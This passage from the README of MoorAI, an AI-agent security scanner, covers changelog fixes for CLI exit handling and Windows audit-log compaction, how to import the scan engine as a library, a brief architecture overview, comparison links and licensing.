  (`moorai-mcp-guard`) and the CLIs that call the console (`moorai-agentwatch`, `moorai-redteam`,
  `moorai-backtest`, `moorai-scan`, `moorai-doctor`, `moorai-cloud-inventory`) now set the exit code and
  let the event loop drain ([`cli/exit-drain.mjs`](cli/exit-drain.mjs)). Leftover TCP sockets are destroyed,
  and a one-second hard exit stays as a backstop for anything else left open. Exit codes are unchanged.
- **Action-audit log compaction.** Windows refuses to rename a file over one that is still open. The
  compaction of `~/.moorai/action-audit.jsonl` renamed over the log while it still had the log open, so
  up to v1.9.0 the log was never trimmed on Windows and `MOORAI_RETENTION_DAYS` never applied there. The
  compactor now closes the log before the rename, retries a refused rename, and gives up two seconds
  after it started. A row appended while a compaction runs is still kept: its writer waits for the
  compaction to finish, then writes the row again if the new log does not have it.
- **CI.** [`windows-js.yml`](.github/workflows/windows-js.yml) runs the hook, MCP gateway, egress, exit
  and ledger tests on `windows-latest` with Node 22 and 24. A file is added to that list only after it
  has passed on a real Windows 11 machine.

## Using the engine as a library

The scan engine is importable as a stable API from the `moorai/scan` entry point, so
another app can depend on this repo directly without reaching into internal paths.

Add it as a pinned git dependency:

```bash
npm install github:gitayg/moorai#v0.82.0
```

Then scan a path on-device (findings are content-free — hashes, never the matched text):

```js
import { scanPath } from "moorai/scan";

const result = scanPath("./some-skill");
console.log(result.verdict); // CLEAN | CAUTION | REVIEW | DO-NOT-INSTALL
```

The barrel (`scan.mjs`) re-exports only the public scan surface — `scanPath`,
`scanFileText`, `buildEngine`, `decideText`, `skillIntents`, `contentHash`,
`skillSurfaceKind`, `isSkillSurface`, and the `VERDICTS` / `VERDICT_RANK` /
`decisionToVerdict` / `worseVerdict` / `tierOf` / `jsonStrings` / `NO_KEY` helpers —
so internal files can move without breaking consumers.

## How it works

A small Rust (Tauri) host wraps the agent's terminal; a local webview runs the detection engine. Prompts, file reads, tool calls, and outputs are checked against a 77-threat matrix (17 categories) + content rules + org-defined detector packs — entirely on the device. A separate, proprietary **management console** adds a multi-tenant dashboard, SSO, fleet policy, and content-free compliance exports (AIBOM, EU AI Act records, board AI-readiness report, SIEM streaming). Open-core: this agent is MIT; the console is commercial.

## Learn more

- **Website & comparisons** — [moorai.dev](https://moorai.dev/)
- **How it stacks up** — vs [Lakera](https://moorai.dev/moorai-vs-lakera.html) · [Prompt Security](https://moorai.dev/moorai-vs-sentinelone.html) · [BigID](https://moorai.dev/moorai-vs-bigid.html) · [Harmonic](https://moorai.dev/moorai-vs-harmonic.html) · [Zenity](https://moorai.dev/moorai-vs-zenity.html) · [Netskope](https://moorai.dev/moorai-vs-netskope.html)

## License

The MoorAI community agent is licensed under the [MIT License](LICENSE). The management server is a separate product, source-available under the [Elastic License 2.0](https://www.elastic.co/licensing/elastic-license).
